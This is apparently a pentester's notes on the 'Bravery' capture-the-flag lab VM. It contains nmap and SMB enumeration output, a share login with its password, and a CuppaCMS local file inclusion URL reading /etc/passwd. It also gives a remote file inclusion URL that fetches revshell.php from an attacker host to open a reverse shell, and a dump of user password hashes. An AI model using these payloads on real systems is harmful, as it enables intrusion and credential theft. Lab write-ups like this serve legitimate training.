```
export IP=192.168.56.101
```
## Summary
1. 
## Nmap Results
<pre style="font-size: 12px";>
PORT      STATE SERVICE     VERSION
<font color=red>22</font>/tcp    open  <font color=red>ssh</font>         <font color=red>OpenSSH 7.4</font> (protocol 2.0)
<font color=red>53</font>/tcp    open  <font color=red>domain</font>     <font color=red> dnsmasq 2.76</font>
| dns-nsid:
|_  bind.version: dnsmasq-2.76
<font color=red>80</font>/tcp    open  <font color=red>http</font>        Apache httpd<font color=red> 2.4.6</font> ((<font color=red>CentOS</font>) OpenSSL/1.0.2k-fips <font color=red>PHP/5.4.16</font>)
| http-methods:
|_  <font color=red>Potentially risky methods: TRACE</font>
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips <font color=red>PHP/5.4.16</font>
|_http-title: Apache HTTP Server Test Page powered by CentOS
<font color=red>111</font>/tcp   open  <font color=red>rpcbind</font>     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      34728/tcp   nlockmgr
|   100021  1,3,4      37320/udp6  nlockmgr
|   100021  1,3,4      46440/tcp6  nlockmgr
|   100021  1,3,4      50567/udp   nlockmgr
|   100024  1          42096/tcp   status
|   100024  1          44653/udp   status
|   100024  1          47809/udp6  status
|   100024  1          51023/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
<font color=red>139</font>/tcp   open  <font color=red>netbios-ssn</font> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
<font color=red>443</font>/tcp   open <font color=red> ssl/http</font>    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
<font color=red>445</font>/tcp   open  <font color=red>netbios-ssn</font> Samba smbd<font color=red> 4.7.1</font> (workgroup: WORKGROUP)
<font color=red>2049</font>/tcp  open <font color=red> nfs_acl</font>     3 (RPC #100227)
<font color=red>3306</font>/tcp  open  <font color=red>mysql</font>       <font color=red>MariaDB</font> (unauthorized)
<font color=red>8080</font>/tcp  open  <font color=red>http</font>       <font color=red> nginx 1.12.2</font>
|_http-server-header: nginx/1.12.2
| http-robots.txt: 4 disallowed entries
|<font color=red>_/cgi-bin/ /qwertyuiop.html /private /public</font>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to Bravery! This is SPARTA!
<font color=red>20048</font>/tcp open  <font color=red>mountd</font>      1-3 (RPC #100005)
<font color=red>34728</font>/tcp open  <font color=red>nlockmgr</font>    1-4 (RPC #100021)
<font color=red>42096</font>/tcp open  <font color=red>status</font>      1 (RPC #100024)
Service Info: Host: BRAVERY
</pre>

<pre style="font-size: 12px";>
<font color=gray># nmap -p139,445 --script=smb-enum-shares $IP</font>
Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\192.168.56.101\IPC$: -> can't list files 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba Server 4.7.1)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\<font color=red>anonymous</font>:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: <font color=red>C:\samba\anonymous</font>
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\<font color=red>secured</font>:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path:<font color=red> C:\samba\secured</font>
|     Anonymous access: <none>
|_    Current user access: <none>
</pre>

<pre style="font-size: 12px";>
<font color=gray># enum4linux $IP</font>
..SNIP..
S-1-22-1-1000 Unix User\<font color=red>david</font> (Local User) # DAVID PHUA -> user on smb
S-1-22-1-1001 Unix User\<font color=red>ossec</font> (Local User)
S-1-22-1-1002 Unix User\<font color=red>ossecm</font> (Local User)
S-1-22-1-1003 Unix User\<font color=red>ossecr</font> (Local User)
S-1-22-1-1004 Unix User\<font color=red>rick</font> (Local User) -> user on smb
..SNIP..
</pre>
<pre style="font-size: 12px";>
Genevieve
</pre>
## Wfuzz
Files


Directories:

## Exploitation
OS: CentOS derived from RHEL
web root: `/var/www/html/`
web server: nginx at `/etc/nginx/` and `/usr/share/nginx/`

```
find . -type f -empty -print -delete # delete empty files recursively
find . -type f -empty -print -delete # delete empty directories recursively
```
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[/mnt]
└─$ smbclient //192.168.56.101/secured -U david
Password for [WORKGROUP\david]: qwertyuioplkjhgfdsazxcvbnm
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 28 09:52:14 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  david.txt                           N      376  Sat Jun 16 04:36:07 2018
  genevieve.txt                       N      398  Mon Jul 23 12:51:27 2018
  README.txt                          N      323  Mon Jul 23 21:58:53 2018

                17811456 blocks of size 1024. 12434492 blocks available
smb: \>
</pre>

https://www.exploit-db.com/exploits/25971
```
http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

```
http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.157:80/revshell.php?
```

## Privilege Escalation
<pre style="font-size: 12px";>
MariaDB [bravery]> select * from cu_users;
+----+---------------+-----------------------------+-------------+----------------------------------+---------+---------------+
| id | name          | email                       | username    | password                         | enabled | user_group_id |
+----+---------------+-----------------------------+-------------+----------------------------------+---------+---------------+
|  1 | Administrator | admin@goodtech.com.sg       | admin       | f49b7babc64b6bc99cb429b1dd2f10de |       1 |             1 |
|  3 | genevieve     | genevieve@goodtech.com.sg   | genevieve   | 57e5ee542f5d13648c5ab1e73f12140c |       1 |             1 |
|  4 | david         | david@goodtech.com.sg       | david       | 6ccb05b8892eba2d8d5892278de39d4e |       1 |             2 |
|  5 | qiu           | qiu@goodtech.com.sg         | qiu         | 16e8d1587723a4ddc28ff8117e6ad0e3 |       1 |             3 |
|  6 | patrick       | patrick@goodtech.com.sg     | patrick     | 87e6d56ce79af90dbe07d387d3d0579e |       1 |             3 |
|  7 | qinyi         | intern3@goodtech.com.sg     | qinyi       | 6d8c198696328b20997f26c1b504df24 |       1 |             3 |
|  8 | govindasamy   | govindasamy@goodtech.com.sg | govindasamy | 5f4dcc3b5aa765d61d8327deb882cf99 |       1 |             3 |
|  9 | roland        | intern5@goodtech.com.sg     | roland      | ee21d5f27a8401788147f6f6184ddb11 |       0 |             3 |
+----+---------------+-----------------------------+-------------+----------------------------------+---------+---------------+
</pre>

![](../../Assets/images/Pasted%20image%2020220807193826.png)